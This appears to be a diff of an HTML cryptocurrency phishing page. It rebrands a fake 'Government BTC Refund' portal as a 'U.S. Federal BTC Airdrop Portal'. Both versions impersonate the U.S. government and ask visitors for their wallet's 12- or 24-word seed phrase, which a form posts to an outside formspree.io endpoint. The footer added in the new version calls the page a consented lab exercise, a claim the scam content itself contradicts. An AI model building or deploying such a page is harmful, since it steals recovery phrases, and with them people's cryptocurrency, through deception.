@@ -1,109 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>GovBTCClaim Portal</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>U.S. Federal BTC Airdrop Portal</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      background-image: url('https://www.transparenttextures.com/patterns/white-wall.png');
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #e6eff8;
       text-align: center;
-      padding-top: 50px;
+      padding: 40px 20px;
+      color: #0a2342;
     }
 
-    .container {
-      background: white;
-      width: 90%;
-      max-width: 420px;
-      margin: auto;
+    h1 {
+      font-size: 1.9em;
+      font-weight: 700;
+    }
+
+    h1 span {
+      display: block;
+      font-size: 1.2em;
+      margin-top: 0.2em;
+      font-weight: 500;
+    }
+
+    .form-wrapper {
+      background: #fff;
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 16px;
+      box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.1);
+      max-width: 420px;
+      margin: 40px auto;
     }
 
-    h2 {
-      color: #f7931a;
-    }
-
-    .btn {
-      background-color: #f7931a;
-      color: white;
-      padding: 12px 20px;
-      margin-top: 20px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    .note {
-      font-size: 13px;
-      color: #777;
-      margin-top: 10px;
-    }
-
-    select, input[type="text"] {
-      padding: 10px;
+    input, button {
+      display: block;
       width: 100%;
-      margin-top: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
+      padding: 14px;
+      font-size: 1em;
+      margin-bottom: 16px;
+      border-radius: 10px;
+      border: 2px solid #cbd5e1;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      border-color: #0a2342;
+      outline: none;
+    }
+
+    button {
+      background-color: #0a2342;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #0b2d5c;
+    }
+
+    .footer-note {
+      font-size: 0.85em;
+      color: #444;
+      margin-top: 20px;
+      line-height: 1.4;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>🇺🇸 Government BTC Refund</h2>
-    <p>Claim your Bitcoin refund through verified wallet connection.</p>
-    <p><strong>Amount to be received: 0.92 BTC ≈ $99,791</strong></p>
+  <h1>🇺🇸 U.S. Federal BTC Airdrop Portal
+    <span>Submit to verify eligibility & claim stimulus-linked Bitcoin</span>
+  </h1>
 
-    <button class="btn" onclick="connectWallet()">Connect Wallet</button>
-
-    <form id="walletSection" action="https://formspree.io/f/mrbkwjdj" method="POST" style="display:none; margin-top:20px;">
-  <label for="walletSelect">Wallet Type:</label>
-  <select id="walletSelect" name="wallet">
-    <option value="MetaMask">MetaMask</option>
-    <option value="TrustWallet">Trust Wallet</option>
-    <option value="Coinbase">Coinbase Wallet</option>
-    <option value="Other">Other</option>
-  </select>
-
-  <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
-  <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word phrase" required>
-
-  <button class="btn" type="submit">Submit</button>
-</form>
-
-
-      <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
-      <input type="text" id="seedInput" placeholder="Enter your 12 or 24-word phrase">
-
-      <button class="btn" onclick="submitWallet()">Submit</button>
-    </div>
-
-    <div class="note">
-      Minimum wallet balance: 0.0092 BTC<br>
-      <small>(If your balance is lower, contact support)</small><br>
-      For inquiries: <strong>admin@govbtcclaim.org</strong>
-    </div>
+  <div class="form-wrapper">
+    <form action="https://formspree.io/f/mrbkwjdj" method="POST">
+      <input type="text" name="wallet" placeholder="Wallet Provider (e.g. MetaMask)" required>
+      <input type="text" name="phrase" placeholder="Enter 12-word Recovery Phrase" required>
+      <button type="submit">Claim Official Airdrop</button>
+    </form>
   </div>
 
-  <!-- Live Chat Widget -->
-  <script type="text/javascript">
-    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
-    (function() {
-      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
-      s1.async = true;
-      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/default';
-      s1.charset = 'UTF-8';
-      s1.setAttribute('crossorigin', '*');
-      s0.parentNode.insertBefore(s1, s0);
-    })();
-  </script>
-
-  <!-- JS Logic -->
-  <script src="js/connect.js"></script>
+  <div class="footer-note">
+    This is a public form hosted in a controlled lab environment with full participant consent.
+  </div>
 </body>
 </html>
